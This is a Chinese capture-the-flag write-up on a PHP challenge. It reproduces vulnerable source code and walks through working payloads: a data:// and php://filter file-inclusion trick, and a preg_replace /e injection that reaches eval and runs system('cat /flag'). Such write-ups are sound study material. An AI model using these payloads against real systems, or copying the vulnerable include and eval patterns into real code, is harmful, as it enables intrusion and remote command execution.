源代码

```php
<?php

error_reporting(0);
$text = $_GET["text"];
$file = $_GET["file"];
if(isset($text)&&(file_get_contents($text,'r')==="I have a dream")){
    echo "<br><h1>".file_get_contents($text,'r')."</h1></br>";
    if(preg_match("/flag/",$file)){
        die("Not now!");
    }

    include($file);  //next.php
    
}
else{
    highlight_file(__FILE__);
}
?>
```

可以直接伪协议过第一步，再读取 next.php

```payload
?text=data://text/plain,I have a dream&file=php://filter/convert.base64-encode/resource=next.php
```

**next.php** 源码

```php
<?php
$id = $_GET['id'];
$_SESSION['id'] = $id;

function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}


foreach($_GET as $re => $str) {
    echo complex($re, $str). "\n";
}

function getFlag(){
	@eval($_GET['cmd']);
}

```

没看懂怎么样才能够命令执行，没有地方调用了 `getFlag()` 函数，看了其他师傅的文章才知道是 `preg_replace` 里面的 `/e` 模式正则的命令执行漏洞。

关注一下 `preg_replace` 部分的代码

```php
function complex($re, $str) {
    return preg_replace(
        '/(' . $re . ')/ei',
        'strtolower("\\1")',
        $str
    );
}
```

**preg_replace** 函数在匹配到符号正则的字符串时，会将替换字符串（也就是 **preg_replace** 函数的第二个参数）当做代码来执行

然而这里的第二个参数却固定为 `'strtolower("\\1")'` 字符串，那这样要如何执行代码呢？

上面的命令执行，相当于 **eval('strtolower("\\1");')** 结果，当中的 **\\1** 实际上就是 **\1** ，而 **\1** 在正则表达式中有自己的含义。我们来看看 [**W3Cschool**](https://www.w3cschool.cn/zhengzebiaodashi/regexp-syntax.html) 中对其的描述：

**反向引用**

对一个正则表达式模式或部分模式 **两边添加圆括号** 将导致相关 **匹配存储到一个临时缓冲区** 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 '\n' 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。

所以这里的 `\1` 实际上指定的是第一个子匹配项，我们拿 **ripstech** 官方给的 **payload** 进行分析，方便大家理解。官方 **payload** 为： `/?.\*={${phpinfo()}}` ，即 **GET** 方式传入的参数名为 `/?.`，值为 `{${phpinfo()}}` 。

```
原先的语句： preg_replace('/(' . $regex . ')/ei', 'strtolower("\\1")', $value);
变成了语句： preg_replace('/(.*)/ei', 'strtolower("\\1")', {${phpinfo()}});
```

> 但是这样子也存在问题，上面的 **preg_replace** 语句如果直接写在程序里面，当然可以成功执行 **phpinfo()** ，然而我们的 **.\*** 是通过 **GET** 方式传入，你会发现无法执行 **phpinfo** 函数
>
> 

我们 `var_dump` 一下 `$_GET` 数组，会发现我们传上去的 `.\*` 变成了 `_\*` 

经过 fuzz 后发现当非法字符为首字母时，只有点号会被替换成下划线：

所以我们要做的就是换一个正则表达式，让其匹配到 `{${phpinfo()}}` 即可执行 `phpinfo` 函数。这里我提供一个 **payload** ： `\S\*=${phpinfo()}` 是可以成功执行的。

那么这样一来，我们就可以调用 `getFlag()` 函数了

目前的 payload 为

```payload
?text=data://text/plain,I have a dream&file=next.php&\S*=${getFlag()}&cmd=xxx
```

命令执行

```
?text=data://text/plain,I have a dream&file=next.php&\S*=${getFlag()}&cmd=system('cat /flag');
```

下面再说说我们为什么要匹配到 **{${phpinfo()}}** 或者 **${phpinfo()}** ，才能执行 **phpinfo** 函数，这是一个小坑。这实际上是 [PHP可变变量](http://php.net/manual/zh/language.variables.variable.php) 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 **${phpinfo()}** 中的 **phpinfo()** 会被当做变量先执行，执行后，即变成 **${1}** (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：

```
var_dump(phpinfo()); // 结果：布尔 true
var_dump(strtolower(phpinfo()));// 结果：字符串 '1'
var_dump(preg_replace('/(.*)/ie','1','{${phpinfo()}}'));// 结果：字符串'11'

var_dump(preg_replace('/(.*)/ie','strtolower("\\1")','{${phpinfo()}}'));// 结果：空字符串''
var_dump(preg_replace('/(.*)/ie','strtolower("{${phpinfo()}}")','{${phpinfo()}}'));// 结果：空字符串''
这里的'strtolower("{${phpinfo()}}")'执行后相当于 strtolower("{${1}}") 又相当于 strtolower("{null}") 又相当于 '' 空字符串
```